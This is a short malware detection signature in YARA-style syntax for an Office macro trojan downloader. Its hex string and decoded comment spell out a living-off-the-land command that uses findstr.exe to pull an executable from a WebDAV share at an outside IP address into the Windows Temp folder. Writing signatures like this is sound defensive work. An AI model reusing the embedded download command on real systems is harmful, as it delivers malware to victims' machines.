
rule TrojanDownloader_O97M_Obfuse_BKA_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BKA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {3d 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 53 79 73 74 65 6d 33 32 5c 66 69 6e 64 73 74 72 2e 65 78 65 20 2f 56 20 2f 4c 20 57 33 41 6c 6c 4c 6f 76 33 4c 6f 6c 42 61 73 20 5c 5c 32 30 2e 36 39 2e 39 37 2e 33 31 5c 77 65 62 64 61 76 5c 75 6d 2e 65 78 65 20 3e 20 43 3a 5c 57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c 75 6d 2e 65 78 65 20 26 26 20 65 78 69 74 } //1 = "C:\Windows\System32\findstr.exe /V /L W3AllLov3LolBas \\20.69.97.31\webdav\um.exe > C:\Windows\Temp\um.exe && exit
	condition:
		((#a_01_0  & 1)*1) >=1
 
}